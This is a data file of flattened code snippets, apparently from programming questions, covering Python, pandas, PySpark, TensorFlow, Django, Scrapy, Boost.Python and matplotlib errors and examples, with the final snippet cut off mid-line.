-- -- -- -- -- -- -- -- -- -- -- -- -- -Microsoft Visual Studio -- -- -- -- -- -- -- -- -- -- -- -- -- -The project file ' C : \Users\user\AppData\Local\Temp\4wdsrkia.hmh\Temp\DjangoWebProject1.pyproj' can not be opened.There is a missing project subtype.Subtype : ' { 5F0BE9CA-D677-4A4D-8806-6076C0FAAD37 } ' is unsupported by this installation. -- -- -- -- -- -- -- -- -- -- -- -- -- -OK Help -- -- -- -- -- -- -- -- -- -- -- -- -- -
"> > > def lcmp ( a , b ) : ... c = a.split ( ) ... d = b.split ( ) ... if ( c [ 1 ] > d [ 1 ] ) : ... if ( c [ 0 ] > d [ 0 ] ) : ... return 1 ... else : ... return -1 ... else : ... if ( c [ 0 ] > d [ 0 ] ) : ... return 1 ... else : ... return 0 ..."
"var M = function ( ) { book = this.book ; emit ( book , { count : 1 } ) ; } var R = function ( key , values ) { var sum = 0 ; values.forEach ( function ( x ) { sum += 1 ; } ) ; var result = { count : sum } ; return result ; } { u'_id ' : u'superiors ' , u'value ' : { u'count ' : 99 } } { u'_id ' : u'superiors ' , u'value ' : { u'count ' : 2.0 } }"
"001436800277225 [ `` 9161492 '' , '' 9161787 '' , '' 9378531 '' ] 009092130698762 [ `` 9394697 '' ] 010003000431538 [ `` 9394697 '' , '' 9426473 '' , '' 9428530 '' ] 010156461231357 [ `` 9350394 '' , '' 9414181 '' ] 010216216021063 [ `` 9173862 '' , '' 9247870 '' ] 010720006581483 [ `` 9018786 '' ] 011199797794333 [ `` 9017977 '' , '' 9091134 '' , '' 9142852 '' , '' 9325464 '' , '' 9331913 '' ] 011337201765123 [ `` 9161294 '' , '' 9198693 '' ] 011414545455156 [ `` 9168185 '' , '' 9178348 '' , '' 9182782 '' , '' 9359776 '' ] 011425002581540 [ `` 9083446 '' , '' 9161294 '' , '' 9309432 '' ] df = getdf ( ) df1 = df.select ( 'uuid ' , explode ( 'news ' ) .alias ( 'news ' ) ) stringIndexer = StringIndexer ( inputCol= '' news '' , outputCol= '' newsIndex '' ) model = stringIndexer.fit ( df1 ) indexed = model.transform ( df1 ) encoder = OneHotEncoder ( inputCol= '' newsIndex '' , outputCol= '' newsVec '' ) encoded = encoder.transform ( indexed ) encoded.show ( 20 , False ) + -- -- -- -- -- -- -- -+ -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- -- -- -- -- -- +|uuid |news |newsIndex|newsVec |+ -- -- -- -- -- -- -- -+ -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- -- -- -- -- -- +|014324000386050|9398253|10415.0 | ( 105721 , [ 10415 ] , [ 1.0 ] ) ||014324000386050|9428530|70.0 | ( 105721 , [ 70 ] , [ 1.0 ] ) ||014324000631752|654112 |1717.0 | ( 105721 , [ 1717 ] , [ 1.0 ] ) ||014324000674240|730531 |2282.0 | ( 105721 , [ 2282 ] , [ 1.0 ] ) ||014324000674240|694306 |1268.0 | ( 105721 , [ 1268 ] , [ 1.0 ] ) ||014324000674240|712016 |4766.0 | ( 105721 , [ 4766 ] , [ 1.0 ] ) ||014324000674240|672307 |7318.0 | ( 105721 , [ 7318 ] , [ 1.0 ] ) ||014324000674240|698073 |1241.0 | ( 105721 , [ 1241 ] , [ 1.0 ] ) ||014324000674240|728044 |5302.0 | ( 105721 , [ 5302 ] , [ 1.0 ] ) ||014324000674240|672256 |1619.0 | ( 105721 , [ 1619 ] , [ 1.0 ] ) ||014324000674240|730236 |2376.0 | ( 105721 , [ 2376 ] , [ 1.0 ] ) ||014324000674240|730235 |14274.0 | ( 105721 , [ 14274 ] , [ 1.0 ] ) ||014324000674240|728509 |1743.0 | ( 105721 , [ 1743 ] , [ 1.0 ] ) ||014324000674240|704528 |10310.0 | ( 105721 , [ 10310 ] , [ 1.0 ] ) ||014324000715399|774134 |8876.0 | ( 105721 , [ 8876 ] , [ 1.0 ] ) ||014324000725836|9357431|3479.0 | ( 105721 , [ 3479 ] , [ 1.0 ] ) ||014324000725836|9358028|15621.0 | ( 105721 , [ 15621 ] , [ 1.0 ] ) ||014324000730349|812106 |4599.0 | ( 105721 , [ 4599 ] , [ 1.0 ] ) ||014324000730349|699237 |754.0 | ( 105721 , [ 754 ] , [ 1.0 ] ) ||014324000730349|748109 |4854.0 | ( 105721 , [ 4854 ] , [ 1.0 ] ) |+ -- -- -- -- -- -- -- -+ -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- -- -- -- -- -- +"
"from contextlib import contextmanager @ contextmanagerdef test ( ) : print ( `` Hello '' ) yield print ( `` goodbye '' ) try : with test ( ) : print ( `` inside test '' ) raise KeyErrorexcept KeyError : print ( `` KeyError '' ) else : print ( `` else '' ) finally : print ( `` finally '' ) Helloinside testKeyErrorfinally Helloinside testgoodbyeKeyErrorfinally Python 3.5.2 ( default , Nov 23 2017 , 16:37:01 ) [ GCC 5.4.0 20160609 ] on linuxType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import sys > > > print ( sys.version ) 3.5.2 ( default , Nov 23 2017 , 16:37:01 ) [ GCC 5.4.0 20160609 ]"
"import threadingimport time # sleeptime = 0.1while True : # time.sleep ( sleeptime ) if not [ thread.name for thread in threading.enumerate ( ) if thread.name == 'control ' ] : threading.Thread ( target=control , name='control ' ) .start ( ) import timei=0before = time.process_time ( ) while True : i += 1 if i > = 100000000 : # 1e8 but writing 1e8 adds ~ 30 % time breakafter = time.process_time ( ) print ( after-before )"
"Ref = [ 3 , 2 , 1 , 12 , 11 , 10 , 9 , 8 , 7 , 6 , 5 , 4 ] Input = [ 9 , 5 , 2 , 3 , 10 , 4 , 11 , 8 ] Sorted_Input = [ 3 , 2 , 11 , 10 , 9 , 8 , 5 , 4 ]"
"# ! /usr/bin/env pythonimport rospyimport structimport ctypesimport sensor_msgs.point_cloud2 as pc2from sensor_msgs.msg import PointCloud2file = open ( 'workfile.txt ' , ' w ' ) def callback ( msg ) : data_out = pc2.read_points ( msg , skip_nans=True ) loop = True while loop : try : int_data = next ( data_out ) s = struct.pack ( ' > f ' , int_data [ 3 ] ) i = struct.unpack ( ' > l ' , s ) [ 0 ] pack = ctypes.c_uint32 ( i ) .value r = ( pack & 0x00FF0000 ) > > 16 g = ( pack & 0x0000FF00 ) > > 8 b = ( pack & 0x000000FF ) file.write ( str ( int_data [ 0 ] ) + '' , '' +str ( int_data [ 1 ] ) + '' , '' +str ( int_data [ 2 ] ) + '' , '' +str ( r ) + '' , '' +str ( g ) + '' , '' +str ( b ) + '' \n '' ) except Exception as e : rospy.loginfo ( e.message ) loop = False file.flush file.closedef listener ( ) : rospy.init_node ( 'writeCloudsToFile ' , anonymous=True ) rospy.Subscriber ( `` /camera/depth/points '' , PointCloud2 , callback ) rospy.spin ( ) if __name__ == '__main__ ' : listener ( )"
"input : ( 3 , 1 , 4 , 2 , 2 , 1 , 1 , 2 ) and capacity = 5output : ( 3 , 1 ) ( 4 ) ( 2 , 2 , 1 ) ( 1 , 2 ) # each subtuple is less than 5 , order safe ."
"import google.appengine.ext.bulkload import connector_interfaceclass MyCustomConnector ( connector_interface.ConnectorInterface ) : ... . # Overridden method def generate_import_record ( self , filename , bulkload_state=None ) : ... . yeild my_custom_dict def feature_post_import ( input_dict , entity_instance , bulkload_state ) : ... . return [ all_entities_to_put ]"
"import tensorflow as tfv = [ 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] n = len ( v ) a = tf.Variable ( v , name = ' a ' ) def cond ( i , a ) : return i < n def body ( i , a ) : tf.assign ( a [ i ] , a [ i-1 ] + a [ i-2 ] ) return i + 1 , ai , b = tf.while_loop ( cond , body , [ 2 , a ] ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /home/hrbigelow/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/control_flow_ops.py '' , line 3210 , in while_loop result = loop_context.BuildLoop ( cond , body , loop_vars , shape_invariants ) File `` /home/hrbigelow/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/control_flow_ops.py '' , line 2942 , in BuildLoop pred , body , original_loop_vars , loop_vars , shape_invariants ) File `` /home/hrbigelow/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/control_flow_ops.py '' , line 2879 , in _BuildLoop body_result = body ( *packed_vars_for_body ) File `` /home/hrbigelow/ai/lb-wavenet/while_var_test.py '' , line 11 , in body tf.assign ( a [ i ] , a [ i-1 ] + a [ i-2 ] ) File `` /home/hrbigelow/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/state_ops.py '' , line 220 , in assign return ref.assign ( value , name=name ) File `` /home/hrbigelow/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/array_ops.py '' , line 697 , in assign raise ValueError ( `` Sliced assignment is only supported for variables '' ) ValueError : Sliced assignment is only supported for variables"
"class BadIdea ( object ) : def __hash__ ( self ) : return random.randint ( 0 , 10000 )"
"word sentence0 cub cadet cub cadet 421 plastex vinyl panels2 spt heat and air conditioner3 closetmaid closetmaid4 ryobi batteries kyobi5 ryobi 10 ' table saw ryobi6 trafficmaster traffic mast5er import pandas as pd , regexdf=pd.read_clipboard ( sep='\s\s+ ' ) test=dftest [ ' ( ? b ) ( ? : WORD ) { e < =2 } ' ] =df.apply ( lambda x : regex.findall ( r ' ( ? b ) ( ? : '+x [ 'word ' ] + ' ) { e < =2 } ' , x [ 'sentence ' ] ) , axis=1 ) test [ ' ( ? b ) ( ? : \wWORD\W ) { e < =2 } ' ] =df.apply ( lambda x : regex.findall ( r ' ( ? b ) ( ? : \w'+x [ 'word ' ] +'\W ) { e < =2 } ' , x [ 'sentence ' ] ) , axis=1 ) test [ ' ( ? V1 ) ( ? b ) ( ? : \w & & WORD ) { e < =2 } ' ] =df.apply ( lambda x : regex.findall ( r ' ( ? V1 ) ( ? b ) ( ? : \w & & '+x [ 'word ' ] + ' ) { e < =2 } ' , x [ 'sentence ' ] ) , axis=1 ) test [ ' ( ? V1 ) ( ? b ) ( ? : WORD & & \W ) { e < =2 } ' ] =df.apply ( lambda x : regex.findall ( r ' ( ? V1 ) ( ? b ) ( ? : '+x [ 'word ' ] + ' & & \W ) { e < =2 } ' , x [ 'sentence ' ] ) , axis=1 )"
"Description Category Level1 Level2The gun shooting that happened in Vegas killed two Crime | High Crime HighDonald Trump elected as President of America Politics | High Politics HighRian won in football qualifier Sports | Low Sports LowBrazil won in football final Sports | High Sports High import pandas as pd # import numpy as npfrom sklearn.feature_extraction.text import TfidfVectorizerfrom sklearn.naive_bayes import BernoulliNBfrom sklearn.ensemble import RandomForestClassifierfrom sklearn.model_selection import train_test_split # from stemming.porter2 import stemfrom nltk.corpus import stopwordsfrom sklearn.model_selection import cross_val_scorestop = stopwords.words ( 'english ' ) data_file = `` Training_dataset_70k '' # Reading the input/ datasetdata = pd.read_csv ( data_file , header = 0 , delimiter= `` \t '' , quoting = 3 , encoding = `` utf8 '' ) data = data.dropna ( ) # Removing stopwords , punctuation and stemmingdata [ 'Description ' ] = data [ 'Description ' ] .apply ( lambda x : ' '.join ( [ word for word in x.split ( ) if word not in ( stop ) ] ) ) data [ 'Description ' ] = data [ 'Description ' ] .str.replace ( ' [ ^\w\s ] ' , ' ' ) .replace ( '\s+ ' , ' ' ) # data [ 'Description ' ] = data [ 'Description ' ] .apply ( lambda x : ' '.join ( [ stem ( word ) for word in x.split ( ) ] ) ) train_data , test_data , train_label , test_label = train_test_split ( data.Description , data.Category , test_size=0.3 , random_state=100 ) RF = RandomForestClassifier ( n_estimators=10 ) vectorizer = TfidfVectorizer ( max_features = 40000 , ngram_range = ( 1,3 ) , sublinear_tf = True ) data_features = vectorizer.fit_transform ( train_data ) RF.fit ( data_features , train_label ) test_data_feature = vectorizer.transform ( test_data ) Output_predict = RF.predict ( test_data_feature ) print `` Overall_Accuracy : `` + str ( np.mean ( Output_predict == test_label ) ) with codecs.open ( `` out_Category.txt '' , `` w '' , `` utf8 '' ) as out : for inp , pred , act in zip ( test_data , Output_predict , test_label ) : try : out.write ( `` { } \t { } \t { } \n '' .format ( inp , pred , act ) ) except : continue from sklearn.feature_extraction.text import TfidfVectorizerfrom sklearn.naive_bayes import BernoulliNBfrom sklearn.ensemble import RandomForestClassifierfrom sklearn.model_selection import train_test_splitfrom stemming.porter2 import stemfrom nltk.stem import PorterStemmerfrom nltk.corpus import stopwordsfrom sklearn.model_selection import cross_val_scorestop = stopwords.words ( 'english ' ) data_file = `` Training_dataset_70k '' # Reading the input/ datasetdata = pd.read_csv ( data_file , header = 0 , delimiter= `` \t '' , quoting = 3 , encoding = `` utf8 '' ) data = data.dropna ( ) # Removing stopwords , punctuation and stemmingdata [ 'Description ' ] = data [ 'Description ' ] .apply ( lambda x : ' '.join ( [ word for word in x.split ( ) if word not in ( stop ) ] ) ) data [ 'Description ' ] = data [ 'Description ' ] .str.replace ( ' [ ^\w\s ] ' , ' ' ) .replace ( '\s+ ' , ' ' ) train_data , test_data , train_label , test_label = train_test_split ( data.Description , data [ [ `` Category '' , `` Level1 '' , `` Level2 '' ] ] , test_size=0.3 , random_state=100 ) RF = RandomForestClassifier ( n_estimators=2 ) vectorizer = TfidfVectorizer ( max_features = 40000 , ngram_range = ( 1,3 ) , sublinear_tf = True ) data_features = vectorizer.fit_transform ( train_data ) print len ( train_data ) , len ( train_label ) print train_labelRF.fit ( data_features , train_label ) test_data_feature = vectorizer.transform ( test_data ) # print test_data_featureOutput_predict = RF.predict ( test_data_feature ) print `` BreadCrumb_Accuracy : `` + str ( np.mean ( Output_predict == test_label ) ) with codecs.open ( `` out_bread_crumb.txt '' , `` w '' , `` utf8 '' ) as out : for inp , pred , act in zip ( test_data , Output_predict , test_label ) : try : out.write ( `` { } \t { } \t { } \n '' .format ( inp , pred , act ) ) except : continue"
"1 > main.cpp1 > c : \cpp_ext\boost\boost_1_47\boost\python\make_function.hpp ( 76 ) : error C2780 : 'boost : :mpl : :vector17 < RT , most_derived < Target , ClassT > : :type & , T0 , T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 , T11 , T12 , T13 , T14 > boost : :python : :detail : :get_signature ( RT ( __thiscall ClassT : :* ) ( T0 , T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 , T11 , T12 , T13 , T14 ) volatile const , Target * ) ' : expects 2 arguments - 1 provided1 > c : \cpp_ext\boost\boost_1_47\boost\python\signature.hpp ( 236 ) : see declaration of 'boost : :python : :detail : :get_signature ' 1 > c : \cpp_ext\boost\boost_1_47\boost\python\make_function.hpp ( 76 ) : error C2784 : 'boost : :mpl : :vector17 < RT , ClassT & , T0 , T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 , T11 , T12 , T13 , T14 > boost : :python : :detail : :get_signature ( RT ( __thiscall ClassT : :* ) ( T0 , T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 , T11 , T12 , T13 , T14 ) volatile const ) ' : could not deduce template argument for 'RT ( __thiscall ClassT : :* ) ( T0 , T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 , T11 , T12 , T13 , T14 ) volatile const ' from 'std : :string ( __cdecl * ) ( const std : :string & , jal : :date : :JULIAN_DATE , const std : :string & , const std : :string & , int , const std : :string & , const std : :string & , const std : :string & , const std : :string & , const std : :string & , const std : :string & , int , const std : :string & , const std : :string & , int , const std : :string & , const std : :string & , const std : :string & , const std : :string & , const std : :string & , int , const std : :string & ) ' 1 > c : \cpp_ext\boost\boost_1_47\boost\python\signature.hpp ( 218 ) : see declaration of 'boost : :python : :detail : :get_signature ' 1 > c : \cpp_ext\boost\boost_1_47\boost\python\make_function.hpp ( 76 ) : error C2780 : 'boost : :mpl : :vector17 < RT , most_derived < Target , ClassT > : :type & , T0 , T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 , T11 , T12 , T13 , T14 > boost : :python : :detail : :get_signature ( RT ( __thiscall ClassT : :* ) ( T0 , T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 , T11 , T12 , T13 , T14 ) volatile , Target * ) ' : expects 2 arguments - 1 provided1 > c : \cpp_ext\boost\boost_1_47\boost\python\signature.hpp ( 236 ) : see declaration of 'boost : :python : :detail : :get_signature '"
"ImportError : dlopen ( /Users/user/anaconda/lib/python2.7/site-packages/rpy2/rinterface/_rinterface.so , 2 ) : Library not loaded : @ rpath/R/lib/libR.dylibReferenced from : /Users/user/anaconda/lib/python2.7/site-packages/rpy2/rinterface/_rinterface.soReason : image not found % load_ext rpy2.ipython"
"class Booking ( models.model ) : # The resource to be reserved resource = models.ForeignKey ( 'Resource ' ) # When to reserve the resource date_range = models.DateRangeField ( ) class Meta : unique_together = ( 'resource ' , 'date_range ' , )"
"Example 1 Class_A = [ 201 , 103,40 , 43,23 , 50,12 , 123,99 , 78 ] Class_B = [ 201 , 129 , 114 , 195 , 180 , 90 , 69 , 62 , 76 , 90 ] Example 2 Class_A = [ 68 , 98,201 , 203,78 , 212,49 , 5,204 , 78 ] Class_B = [ 52 , 19 , 220 , 219 , 159 , 195 , 99 , 23 , 46 , 50 ] Example_1_Class_A = np.dot ( Example_1_Class_A , np.transpose ( Example_1_Class_A ) ) Example_1_Class_B = np.dot ( Example_1_Class_B , np.transpose ( Example_1_Class_B ) ) Example_2_Class_A = np.dot ( Example_2_Class_A , np.transpose ( Example_2_Class_A ) ) Example_2_Class_B = np.dot ( Example_2_Class_B , np.transpose ( Example_2_Class_B ) ) Sw = sum ( [ Example_1_Class_A , Example_1_Class_B , Example_2_Class_A , Example_2_Class_B ] , axis=0 ) Example_1_Class_A_mean = Example_1_Class_A.mean ( axis=0 ) Example_1_Class_B_mean = Example_1_Class_B.mean ( axis=0 ) Example_2_Class_A_mean = Example_2_Class_A.mean ( axis=0 ) Example_2_Class_B_mean = Example_2_Class_B.mean ( axis=0 ) Example_1_Class_A_Sb = np.dot ( Example_1_Class_A_mean , np.transpose ( Example_1_Class_A_mean ) ) Example_1_Class_B_Sb = np.dot ( Example_1_Class_B_mean , np.transpose ( Example_1_Class_B_mean ) ) Example_2_Class_A_Sb = np.dot ( Example_2_Class_A_mean , np.transpose ( Example_2_Class_A_mean ) ) Example_2_Class_B_Sb = np.dot ( Example_2_Class_B_mean , np.transpose ( Example_2_Class_B_mean ) ) Sb = sum ( [ Example_1_Class_A_Sb , Example_1_Class_B_Sb , Example_2_Class_A_Sb , Example_2_Class_B_Sb ] , axis=0 )"
"data = { '08132012 ' : { 'id01 ' : [ { 'code ' : '02343 ' , 'status ' : ' P ' } , { 'code ' : '03343 ' , 'status ' : ' F ' } ] , 'id02 ' : [ { 'code ' : '18141 ' , 'status ' : ' F ' } , { 'code ' : '07777 ' , 'status ' : ' F ' } ] } } for date in data : for id in data [ date ] : for trans in data [ date ] [ id ] : print `` Date : % s '' % date print `` Processing id : % s '' % id print trans [ 'code ' ] print trans [ 'status ' ] //query to database"
"from django.utils.thread_support import currentThread_requests = { } def get_request ( ) : return _requests [ currentThread ( ) ] class GlobalRequestMiddleware ( object ) : def process_request ( self , request ) : _requests [ currentThread ( ) ] = request ImproperlyConfigured : Error importing middleware myProject.middleware.global : `` No module named thread_support '' from threading import local_active = local ( ) def get_request ( ) : return _active.requestclass GlobalRequestMiddleware ( object ) : def process_view ( self , request , view_func , view_args , view_kwargs ) : _active.request = request return None"
"df = pd.DataFrame ( { 'team ' : [ 'Warriors ' , 'Warriors ' , 'Warriors ' , 'Rockets ' , 'Rockets ' ] , 'player ' : [ 'Stephen Curry ' , 'Klay Thompson ' , 'Kevin Durant ' , 'Chris Paul ' , 'James Harden ' ] } ) for team , team_df in df.groupby ( by='team ' ) : # team_df = team_df.copy ( ) # produces no warning team_df [ 'rank ' ] = 10 # produces warning team_df.loc [ : , 'rank ' ] = 10 # produces warningSettingWithCopyWarning : A value is trying to be set on a copy of a slice from a DataFrame.Try using .loc [ row_index , col_indexer ] = value insteaddf_team [ 'rank ' ] = 10"
"class Component ( Model ) : id = IntegerField ( primary_key=True ) title = CharField ( ) class GroupComponentMap ( Model ) : group = ForeignKeyField ( Component , related_name='group_fk ' ) service = ForeignKeyField ( Component , related_name='service_fk ' ) comp = ( Component .select ( Component , GroupComponent.group.alias ( 'group_id ' ) ) .join ( GroupComponent , on= ( Component.id == GroupComponent.group ) ) ) for row in comp : print row.group_id"
"class tInt ( int ) : def __add__ ( self , other ) : if type ( other ) == str : return str ( self ) + str ( other ) elif type ( other ) == int : return int ( self ) + other elif type ( other ) == float : return float ( self ) + float ( other ) else : return self + othera = tInt ( 2 ) print ( a + `` 5 '' ) print ( `` 5 '' + a ) > > 25Traceback ( most recent call last ) : File `` C : \example.py '' , line 14 , in < module > print ( `` 5 '' + a ) TypeError : Ca n't convert 'tInt ' object to str implicitly"
"import numpy as npimport randomimport uuid # Creating the N vocabulary and M vocabularymax_word_len = 20n_vocab_size = random.randint ( 8000,10000 ) m_vocab_size = random.randint ( 8000,10000 ) def random_word ( ) : return str ( uuid.uuid4 ( ) .get_hex ( ) .upper ( ) [ 0 : random.randint ( 1 , max_word_len ) ] ) # Generate some random words.n_vocab = [ random_word ( ) for i in range ( n_vocab_size ) ] m_vocab = [ random_word ( ) for i in range ( m_vocab_size ) ] # Let 's hallucinate probabilities for each word pair.hashes = { ( n , m ) : random.random ( ) for n in n_vocab for m in m_vocab } { ( '585F ' , 'B4867 ' ) : 0.7582038699473549 , ( '69 ' , 'D98B23C5809A ' ) : 0.7341569569849136 , ( '4D30CB2BF4134 ' , '82ED5FA3A00E4728AC ' ) : 0.9106077161619021 , ( 'DD8F8AFA5CF ' , 'CB ' ) : 0.4609114677237601 , ... } n_words , m_words = zip ( *hashes.keys ( ) ) probs = np.array ( [ [ hashes [ ( n , m ) ] for n in n_vocab ] for m in m_vocab ] ) $ echo -e 'abc\txyz\t0.9\nefg\txyz\t0.3\nlmn\topq\t\0.23\nabc\tjkl\t0.5\n ' > test.txt $ cat test.txtabc xyz 0.9efg xyz 0.3lmn opq .23abc jkl 0.5 $ pythonPython 2.7.10 ( default , Jul 30 2016 , 18:31:42 ) [ GCC 4.2.1 Compatible Apple LLVM 8.0.0 ( clang-800.0.34 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import pandas as pd > > > pt = pd.read_csv ( 'test.txt ' , index_col= [ 0,1 ] , header=None , delimiter='\t ' ) .unstack ( ) .as_matrix ( ) > > > ptarray ( [ [ 0.5 , nan , 0.9 ] , [ nan , nan , 0.3 ] , [ nan , nan , nan ] ] ) > > > pd.read_csv ( 'test.txt ' , index_col= [ 0,1 ] , header=None , delimiter='\t ' ) .unstack ( ) 2 1 jkl opq xyz0 abc 0.5 NaN 0.9efg NaN NaN 0.3lmn NaN NaN NaN > > > df = pd.read_csv ( 'test.txt ' , index_col= [ 0,1 ] , header=None , delimiter='\t ' ) .unstack ( ) > > > df 2 1 jkl opq xyz0 abc 0.5 NaN 0.9efg NaN NaN 0.3lmn NaN NaN NaN > > > df [ 'abc ' , 'jkl ' ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2055 , in __getitem__ return self._getitem_multilevel ( key ) File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2099 , in _getitem_multilevel loc = self.columns.get_loc ( key ) File `` /Library/Python/2.7/site-packages/pandas/indexes/multi.py '' , line 1617 , in get_loc return self._engine.get_loc ( key ) File `` pandas/index.pyx '' , line 139 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4160 ) File `` pandas/index.pyx '' , line 161 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4024 ) File `` pandas/src/hashtable_class_helper.pxi '' , line 732 , in pandas.hashtable.PyObjectHashTable.get_item ( pandas/hashtable.c:13161 ) File `` pandas/src/hashtable_class_helper.pxi '' , line 740 , in pandas.hashtable.PyObjectHashTable.get_item ( pandas/hashtable.c:13115 ) KeyError : ( 'abc ' , 'jkl ' ) > > > df [ 'abc ' ] [ 'jkl ' ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2055 , in __getitem__ return self._getitem_multilevel ( key ) File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2099 , in _getitem_multilevel loc = self.columns.get_loc ( key ) File `` /Library/Python/2.7/site-packages/pandas/indexes/multi.py '' , line 1597 , in get_loc loc = self._get_level_indexer ( key , level=0 ) File `` /Library/Python/2.7/site-packages/pandas/indexes/multi.py '' , line 1859 , in _get_level_indexer loc = level_index.get_loc ( key ) File `` /Library/Python/2.7/site-packages/pandas/indexes/base.py '' , line 2106 , in get_loc return self._engine.get_loc ( self._maybe_cast_indexer ( key ) ) File `` pandas/index.pyx '' , line 139 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4160 ) File `` pandas/index.pyx '' , line 163 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4090 ) KeyError : 'abc ' > > > df [ 0 ] [ 2 ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2055 , in __getitem__ return self._getitem_multilevel ( key ) File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2099 , in _getitem_multilevel loc = self.columns.get_loc ( key ) File `` /Library/Python/2.7/site-packages/pandas/indexes/multi.py '' , line 1597 , in get_loc loc = self._get_level_indexer ( key , level=0 ) File `` /Library/Python/2.7/site-packages/pandas/indexes/multi.py '' , line 1859 , in _get_level_indexer loc = level_index.get_loc ( key ) File `` /Library/Python/2.7/site-packages/pandas/indexes/base.py '' , line 2106 , in get_loc return self._engine.get_loc ( self._maybe_cast_indexer ( key ) ) File `` pandas/index.pyx '' , line 139 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4160 ) File `` pandas/index.pyx '' , line 161 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4024 ) File `` pandas/src/hashtable_class_helper.pxi '' , line 404 , in pandas.hashtable.Int64HashTable.get_item ( pandas/hashtable.c:8141 ) File `` pandas/src/hashtable_class_helper.pxi '' , line 410 , in pandas.hashtable.Int64HashTable.get_item ( pandas/hashtable.c:8085 ) KeyError : 0 > > > df [ 0 ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2055 , in __getitem__ return self._getitem_multilevel ( key ) File `` /Library/Python/2.7/site-packages/pandas/core/frame.py '' , line 2099 , in _getitem_multilevel loc = self.columns.get_loc ( key ) File `` /Library/Python/2.7/site-packages/pandas/indexes/multi.py '' , line 1597 , in get_loc loc = self._get_level_indexer ( key , level=0 ) File `` /Library/Python/2.7/site-packages/pandas/indexes/multi.py '' , line 1859 , in _get_level_indexer loc = level_index.get_loc ( key ) File `` /Library/Python/2.7/site-packages/pandas/indexes/base.py '' , line 2106 , in get_loc return self._engine.get_loc ( self._maybe_cast_indexer ( key ) ) File `` pandas/index.pyx '' , line 139 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4160 ) File `` pandas/index.pyx '' , line 161 , in pandas.index.IndexEngine.get_loc ( pandas/index.c:4024 ) File `` pandas/src/hashtable_class_helper.pxi '' , line 404 , in pandas.hashtable.Int64HashTable.get_item ( pandas/hashtable.c:8141 ) File `` pandas/src/hashtable_class_helper.pxi '' , line 410 , in pandas.hashtable.Int64HashTable.get_item ( pandas/hashtable.c:8085 ) KeyError : 0 probs [ ( '585F ' , 'B4867 ' ) ] = 0.7582038699473549"
"def extract_data ( self , response ) : title = response.xpath ( '//html/head/title/text ( ) ' ) .extract ( ) [ 0 ] .strip ( ) my_item = MyItem ( ) my_item [ 'title ' ] = title file_url = response.xpath ( ' ... get url of file ... ' ) file_urls = [ file_url ] # here there can be more urls , so I 'm storing like a list fi = FileItem ( ) fi [ 'file_urls ' ] = file_urls yield my_item yield fi from scrapy.pipelines.files import FilesPipelineclass CustomFilesPipeline ( FilesPipeline ) : def file_path ( self , request , response=None , info=None ) : filename = format_filename ( request.url ) return filename class MyItem ( scrapy.Item ) : title = scrapy.Field ( ) class FileItem ( scrapy.Item ) : file_urls = scrapy.Field ( ) files = scrapy.Field ( ) ITEM_PIPELINES = { 'myscraping.pipelines.CustomFilesPipeline ' : 100 } title1title2 , ,title3etc ."
"import maya.OpenMaya as omimport maya.cmds as cmdsdef func ( retCode , clientData ) : objExist = cmds.objExists ( 'pSphere1 ' ) om.MScriptUtil.setBool ( retCode , ( not objExist ) ) # Cancel save if there 's pSphere1 in the scenecb_id = om.MSceneMessage.addCheckCallback ( om.MSceneMessage.kBeforeSaveCheck , func )"
"import numpy as npimport matplotlib.pyplot as plt # get 4 polar axes in a rowfig , axes = plt.subplots ( 2 , 2 , subplot_kw= { 'projection ' : 'polar ' } , figsize= ( 8 , 8 ) ) # set facecolor to better display the boundaries # ( as suggested by ImportanceOfBeingErnest ) fig.set_facecolor ( 'paleturquoise ' ) for i , theta_max in enumerate ( [ 2*np.pi , np.pi , 2*np.pi/3 , np.pi/3 ] ) : # define theta vector with varying end point and some data to plot theta = np.linspace ( 0 , theta_max , 181 ) data = ( 1/6 ) *np.abs ( np.sin ( 3*theta ) /np.sin ( theta/2 ) ) # set 'thetamin ' and 'thetamax ' according to data axes [ i//2 , i % 2 ] .set_thetamin ( 0 ) axes [ i//2 , i % 2 ] .set_thetamax ( theta_max*180/np.pi ) # actually plot the data , fine tune radius limits and add labels axes [ i//2 , i % 2 ] .plot ( theta , data ) axes [ i//2 , i % 2 ] .set_ylim ( [ 0 , 1 ] ) axes [ i//2 , i % 2 ] .set_xlabel ( 'Magnitude ' , fontsize=15 ) axes [ i//2 